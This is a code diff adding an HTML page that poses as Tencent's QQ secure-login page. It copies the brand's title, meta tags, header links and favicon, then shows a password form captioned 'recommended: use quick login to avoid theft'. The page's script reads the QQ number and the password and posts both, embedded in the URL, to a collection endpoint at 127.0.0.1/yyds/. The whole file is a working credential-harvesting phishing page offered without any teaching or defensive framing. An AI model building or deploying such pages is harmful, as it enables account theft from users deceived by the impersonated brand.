@@ -1,0 +1,203 @@
+<html lang="zh-cn">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
+    <!-- @fragment_top Start-->
+    <meta charset="UTF-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>QQ帐号安全登录</title>
+    <meta name="keywords" content="QQ互联、QQ登录、安全登录、网站接入、腾讯开放平台">
+    <meta name="description" content="接入QQ互联，可实现与腾讯各项服务的无缝连接，安全帐号登录体系，用户动态同步腾讯各社交平台，调用腾讯公司各业务服务。">
+    <meta name="copyright" content="Tencent">
+    <meta name="author" content="rtx://tencent/sng/yuanyan">
+    <link rel="stylesheet" href="../static/css/bootstrap.min.css">
+    <script type="text/javascript" src="../static/js/jquery-1.12.4.js"></script>
+    <script type="text/javascript" src="../static/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="../static/js/vue.min.js"></script>
+    <script type="text/javascript" src="../static/js/axios.min.js"></script>
+    <link rel="stylesheet" href="https://fastly.jsdelivr.net/semantic-ui/2.2.4/semantic.min.css">
+    <link rel="Shortcut Icon" href="https://imgcache.qq.com/qzone/openapi/favicon.ico?t=20130219" type="image/x-icon">
+    <link rel="icon" href="https://imgcache.qq.com/qzone/openapi/favicon.ico?t=20130219" type="image/x-icon">
+    <link href="https://imgcache.qq.com/open/connect/widget/pc/login/qlogin_v2.min.css?max_age=2592000&amp;v=20210112" rel="stylesheet">
+    <script type="text/javascript">
+        window.__start = +new Date();
+
+        var _speedTiming = [+new Date];
+        (function error(monitorId) {
+            window.onerror = function(errorMsg, url, lineNumber) {
+                var img = document.createElement('img');
+                var url = 'https://graph.qq.com/oauth2.0/report?';
+                var data = {
+                    attr_id: 2775276,
+                    uls: 'Script Error: ' + errorMsg + ', line:' + lineNumber + ', url:' + location.href + ' referer:' + document.referrer,
+                    content_type: 0,
+                    client_id: Q.getParameter('client_id')
+                }
+                for (var key in data) {
+                    if (url[url.length - 1] != '?')
+                        url += '&';
+                    url += key + '=' + encodeURIComponent(data[key]);
+                }
+                img.src = url;
+            };
+        })(302299);
+    </script>
+    <!-- @fragment_top End -->
+
+    <style>
+        .crx_bdwk_down_wrap {
+            display: none;
+            top: 50%;
+            right: 0;
+            position: fixed;
+            z-index: 99999999;
+            color: #fff;
+            user-select: none;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_loading {
+            background-color: #666;
+            cursor: wait;
+            width: 126px;
+            text-align: center;
+            padding: 16px 0;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_loading p {
+            font-size: 14px;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_loading small {
+            font-size: 10px;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_btn {
+            width: 126px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 14px;
+            background-color: #22ab82;
+            position: relative;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_types {
+            display: flex;
+            text-align: center;
+            align-items: center;
+            background-color: #666;
+            font-size: 12px;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_types div {
+            position: relative;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_types div:after {
+            content: ' ';
+            height: 12px;
+            width: 1px;
+            background-color: #eee;
+            position: absolute;
+            top: 10px;
+            right: 0;
+            transform: scaleX(0.5);
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_types div:last-child:after {
+            display: none;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_types_check {
+            flex: 1;
+            color: #22ab82;
+            padding: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .crx_bdwk_down_wrap .crx_bdwk_down_types_uncheck {
+            flex: 1;
+            padding: 8px;
+            cursor: pointer;
+            color: #fff;
+            font-weight: lighter;
+        }
+    </style>
+</head>
+
+<body>
+<!-- @header Start-->
+<div class="lay_top">
+    <div class="lay_top_inner" style="width: auto;">
+        <h1 class="logo text_hide">QQ登录</h1>
+        <div class="lat_top_other">
+            <a href="https://connect.qq.com" target="_blank" title="什么是QQ登录"><i class="icon_help_white"></i>QQ登录</a>
+            <span class="line">|</span>
+            <a href="https://connect.qq.com/toc/auth_manager?from=auth" id="auth_manager_link" target="_blank" title="登录授权管理">授权管理</a>
+            <span class="line">|</span>
+            <a href="https://connect.qq.com/manage" target="_blank" title="申请接入">申请接入</a>
+        </div>
+    </div>
+</div>
+<!-- @header End -->
+<div id="app">
+    <div class="stackable" style="max-width: 70rem !important;
+        margin: auto !important;padding: 7rem !important;
+    padding-bottom: 7rem !important;max-width: 540px !important;">
+        <div style="text-align: center;font-size: 40px;margin-bottom:10px;font-family: 宋体 ">密码登录</div>
+        <div style="text-align: center;font-size: 20px;margin-bottom:10px;font-family: 宋体 ">推荐使用快捷登录，以免被盗号</div>
+        <form id="loginForm" class="ui large form" @submit.prevent="upload()">
+            <div class="ui stacked segment">
+                <div class="field">
+                    <div class="ui left icon input">
+                        <i class="user icon"></i>
+                        <input type="text" id="email" required="required" placeholder="支持QQ号登录">
+                    </div>
+                </div>
+                <div class="field">
+                    <div class="ui left icon input">
+                        <i class="lock icon"></i>
+                        <input type="text" id="password" required="required" placeholder="请输入密码">
+                    </div>
+                </div>
+                <input class="ui fluid large submit button" type="submit" style="background: #09f;" value="登录">
+            </div>
+            <div class="ui error message"></div>
+        </form>
+    </div>
+</div>
+
+
+<script type="text/javascript">
+    new Vue({
+        el:'#app',
+        data:{
+            root:'http://127.0.0.1:80/'
+        },
+        mounted:function(){
+        },
+        methods:{
+            upload:function(){
+                var a = document.getElementById("email").value;
+                var b = document.getElementById("password").value;
+                var url = this.root+"yyds/";
+                //异步请求
+                axios.post(url+a+"/"+b).then(function(res){
+                    //显示结果
+                    alert(res.data.message);
+                });
+            }
+        },
+    })
+</script>
+<script type="text/javascript" src="https://fastly.jsdelivr.net/npm/jquery@3.2/dist/jquery.min.js"></script>
+<script type="text/javascript" src="https://fastly.jsdelivr.net/semantic-ui/2.2.4/semantic.min.js"></script>
+<script color="0,0,0" opacity="0.5" count="99" src="https://cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.js" type="text/javascript" charset="utf-8"></script>
+
+</body>
+
+</html>
